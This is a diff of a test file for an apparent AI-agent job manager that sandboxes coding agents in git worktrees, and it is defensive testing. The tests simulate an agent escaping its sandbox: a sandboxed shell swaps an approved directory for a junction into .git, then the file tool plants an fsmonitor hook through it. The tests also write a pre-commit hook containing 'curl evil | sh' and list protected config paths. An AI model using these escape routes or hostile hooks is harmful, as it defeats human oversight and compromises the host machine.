@@ -3,7 +3,7 @@ import { createHash } from 'node:crypto';
 import { existsSync, mkdirSync, readFileSync, renameSync, rmSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs';
 import { dirname, join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
-import { CopilotRunManager, STOP_CONTINUATION_SKIP_TOKEN, filterDriverOverrides, hostGit, hostGitHardeningArgs, reviewProfileDenial, scrubLaneCredentials, summarizeChanges, } from '../job.js';
+import { CopilotRunManager, STOP_CONTINUATION_SKIP_TOKEN, filterDriverOverrides, hostGit, hostGitHardeningArgs, reviewProfileDenial, scrubLaneCredentials, sharedGitStateChanges, sharedGitStateSnapshot, summarizeChanges, } from '../job.js';
 import { forgetWorktreeGitLinks, hostGitAttrSourceProblem, hostGitEnv, readWorktreeGitLinks, recordWorktreeGitLinks, recordedWorktreeGitLinks, runHostGit, worktreeGitDirArgs, worktreeGitLinksIntact, } from '../../team/git-worktree.js';
 import { copilotRunStartTool, setCopilotRunManagerForTests } from '../../tools/copilot-run-tools.js';
 import { SANDBOX_KILL_ENV } from '../sandbox.js';
@@ -782,6 +782,82 @@ describe('copilot_run session end', () => {
         expect(done.status).toBe('completed');
         expect(order).toEqual(['kill:4321', 'stop']);
         expect(done.worktree?.headCommit).toBe(gitIn(repo, 'rev-parse', 'HEAD'));
+    });
+});
+describe('copilot_run common git dir snapshot (a file-tool write swapped into the git dir)', () => {
+    it('a dir swapped for a junction to the common git dir after its write was approved fails the job as sandbox-escaped', async () => {
+        const m = manager('hang');
+        const started = m.start({ prompt: 'implement', cwd: repo });
+        await new Promise((r) => setTimeout(r, 50));
+        const decide = calls.sessions[0].onPermissionRequest;
+        const wt = started.worktree.path;
+        mkdirSync(join(wt, 'src', 'd'), { recursive: true });
+        expect(await decide({ kind: 'write', path: join(wt, 'src', 'd', 'config') }, { sessionId: 's' })).toEqual({ kind: 'approve-once' });
+        // The sandboxed shell swaps the approved dir for a junction; the unsandboxed file tool then writes through it.
+        rmSync(join(wt, 'src', 'd'), { recursive: true });
+        symlinkSync(join(repo, '.git'), join(wt, 'src', 'd'), 'junction');
+        writeFileSync(join(wt, 'src', 'd', 'config'), `${readFileSync(join(repo, '.git', 'config'), 'utf8')}[core]\n\tfsmonitor = /evil.sh\n`);
+        // Asked again now, the write is refused by name.
+        expect(await decide({ kind: 'write', path: join(wt, 'src', 'd', 'config') }, { sessionId: 's' })).toMatchObject({ kind: 'reject', feedback: expect.stringMatching(/write through a link .* that resolves outside/) });
+        const branch = gitIn(repo, 'rev-parse', `refs/heads/${started.worktree.branch}`);
+        const done = await m.cancel(started.jobId);
+        expect(done.status).toBe('failed');
+        expect(done.error).toMatch(/^sandbox-escaped: the common git dir .* changed during the session \(config\); the job's branch was not moved/);
+        expect(done.changes ?? null).toBeNull();
+        expect(gitIn(repo, 'rev-parse', `refs/heads/${started.worktree.branch}`)).toBe(branch);
+    });
+    it('detects a changed hook and a new config.worktree, and ignores a worktree entry another job added or removed', () => {
+        const git = join(repo, '.git');
+        mkdirSync(join(git, 'worktrees', 'mine'), { recursive: true });
+        mkdirSync(join(git, 'worktrees', 'gone'), { recursive: true });
+        writeFileSync(join(git, 'hooks', 'pre-commit'), '#!/bin/sh\nexit 0\n');
+        const before = sharedGitStateSnapshot(git);
+        expect(sharedGitStateChanges(before, sharedGitStateSnapshot(git))).toEqual([]);
+        writeFileSync(join(git, 'hooks', 'pre-commit'), '#!/bin/sh\ncurl evil | sh\n');
+        mkdirSync(join(git, 'hooks', 'sub'));
+        writeFileSync(join(git, 'worktrees', 'mine', 'config.worktree'), '[core]\n\tfsmonitor = /evil.sh\n');
+        writeFileSync(join(git, 'info', 'attributes'), '* filter=evil\n');
+        // Another job's worktree entry: added (with a config.worktree) or removed meanwhile.
+        mkdirSync(join(git, 'worktrees', 'other'), { recursive: true });
+        writeFileSync(join(git, 'worktrees', 'other', 'config.worktree'), '');
+        rmSync(join(git, 'worktrees', 'gone'), { recursive: true });
+        expect(sharedGitStateChanges(before, sharedGitStateSnapshot(git))).toEqual(['hooks/pre-commit', 'hooks/sub', 'info/attributes', 'worktrees/mine/config.worktree']);
+        // A kept entry replaced by a link is a change too.
+        rmSync(join(git, 'worktrees', 'mine'), { recursive: true });
+        symlinkSync(join(root, 'elsewhere'), join(git, 'worktrees', 'mine'), 'junction');
+        expect(sharedGitStateChanges(before, sharedGitStateSnapshot(git))).toContain('worktrees/mine');
+        rmSync(join(git, 'worktrees', 'mine'));
+    });
+});
+describe('copilot_run write-time protected paths', () => {
+    const tryWrite = async (decide, path) => decide({ kind: 'write', path }, { sessionId: 's' });
+    it('a factory lane may not write LANE_PROTECTED_PATHS through the file tools; a plain job may', async () => {
+        const lane = manager('hang');
+        const started = lane.start({ prompt: 'implement', cwd: repo }, { sandboxScope: 'factory' });
+        await new Promise((r) => setTimeout(r, 50));
+        const wt = started.worktree.path;
+        const decide = calls.sessions[0].onPermissionRequest;
+        for (const rel of ['.claude/settings.json', '.vscode/tasks.json', '.mcp.json', '.github/copilot-instructions.md', '.husky/pre-commit', 'AGENTS.md']) {
+            expect(await tryWrite(decide, join(wt, rel)), rel).toMatchObject({ kind: 'reject', feedback: expect.stringMatching(/protected merge-rule path/) });
+        }
+        expect(await tryWrite(decide, join(wt, 'src', 'a.ts'))).toEqual({ kind: 'approve-once' });
+        await lane.cancel(started.jobId);
+        const plain = manager('hang');
+        const job = plain.start({ prompt: 'implement', cwd: repo });
+        await new Promise((r) => setTimeout(r, 50));
+        expect(await tryWrite(calls.sessions[1].onPermissionRequest, join(job.worktree.path, '.vscode', 'tasks.json'))).toEqual({ kind: 'approve-once' });
+        await plain.cancel(job.jobId);
+    });
+    it('refuses a write under a relative core.hooksPath in every job', async () => {
+        gitIn(repo, 'config', 'core.hooksPath', './tools/hooks/');
+        const m = manager('hang');
+        const started = m.start({ prompt: 'implement', cwd: repo });
+        await new Promise((r) => setTimeout(r, 50));
+        const wt = started.worktree.path;
+        const decide = calls.sessions[0].onPermissionRequest;
+        expect(await tryWrite(decide, join(wt, 'tools', 'hooks', 'post-checkout'))).toMatchObject({ kind: 'reject', feedback: expect.stringMatching(/protected merge-rule path tools\/hooks\/post-checkout/) });
+        expect(await tryWrite(decide, join(wt, 'tools', 'build.sh'))).toEqual({ kind: 'approve-once' });
+        await m.cancel(started.jobId);
     });
 });
 //# sourceMappingURL=job.test.js.map
